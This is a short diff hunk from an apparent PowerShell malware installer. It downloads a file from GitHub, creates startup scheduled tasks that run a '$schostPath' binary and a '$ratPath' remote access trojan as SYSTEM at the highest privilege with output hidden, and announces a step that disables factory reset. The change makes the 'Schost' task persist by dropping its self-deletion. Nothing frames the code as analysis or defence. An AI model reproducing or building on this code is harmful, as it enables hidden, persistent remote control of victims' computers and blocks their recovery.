@@ -21,7 +21,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/w
 
 
 Write-Host "[4/7]" -ForegroundColor Cyan
-schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath & schtasks /delete /tn Schost /f" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
+schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
 schtasks /create /tn "Win" /tr "cmd /c start /b $ratPath & schtasks /delete /tn Win /f" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
 
 Write-Host "[+] Disabling Factory Reset......"  -ForegroundColor Red
